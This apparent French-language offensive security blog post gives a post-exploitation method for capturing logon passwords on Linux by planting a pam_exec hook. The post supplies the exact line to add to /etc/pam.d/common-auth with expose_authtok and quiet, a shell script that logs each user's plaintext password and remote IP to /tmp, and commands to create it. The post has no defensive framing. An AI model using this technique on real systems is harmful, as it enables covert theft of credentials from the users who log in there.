---
title: Sniffing de password avec PAM 
meta_title: ""
description: Cet article aborde la technique de récupération des password au Logon avec PAM. 
date: 2024-04-04T05:00:00Z
image: /images/PAM.jpeg
categories:
  - Méthodes
author: Tmax
tags:
  - Méthodes
  - Fiches
  - PAM
  - Post-exploitation
draft: false
---

Cette technique peut etre gamechanger à la suite d'une escalation de privilège.

Prérequis : 
- Vous remarquez un Bot ou une crontab qui s'execute fréquemment 
- Vous avez des droits de modifications dans le répertoire `/etc/pam.d`
- Vous pouvez lire le fichier `/var/log/auth.log`

Après avoir constaté que vous remplissez les conditions requises, vous remarquez qu'à chaque execution de la tâche planifiée, une ligne comme celle-ci apparait :

{{< image src="images/methode_sniffing_pam1.png" caption="" alt="alter-text" height="" width="" position="center" command="fill" option="q100" class="img-fluid" title="image title" webp="false" >}}

Ce qui signifie qu'une une authentification s'effectue avec l'utilisateur root ou un autre utilisateur avec `su`. 

Il est possible de récupérer le mot de passe utilisé durant cette authentification. 

Pour cela, on utilise le module `pam_exec`. Le principe est simple, on va lui dira qu'à chaque authentification, il appel notre script. `expose_authtok` permet de pouvoir lire le mot de passe passé en stdin et `quiet` pour s'assurer de ne pas être visible par l'utilisateur. 

On modifie alors le fichier de configuration `/etc/pam.d/common-auth` pour y ajouter cette ligne (bien espacer chaque mot par un tabulation `\t`): 

```bash
auth    optional    pam_exec.so quiet   expose_authtok  /tmp/sniffing.sh
```

Voici le contenu de /tmp/sniffing.sh

```bash
#!/bin/sh
echo "$(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /tmp/sniffing.log
```

Cela affichera la date et l'heure, l'utilisateur puis son mot de passe ainsi que l'IP de l'hôte distant et sera envoyé vers notre fichier de log. 

```bash
echo -e '#!/bin/sh\necho "$(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /tmp/sniffing.log' > /tmp/sniffing.sh

touch /tmp/sniffing.log

chmod 777 /tmp/sniffing.* 
```

Source : [Post Exploitation: Sniffing Logon Passwords with PAM](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)

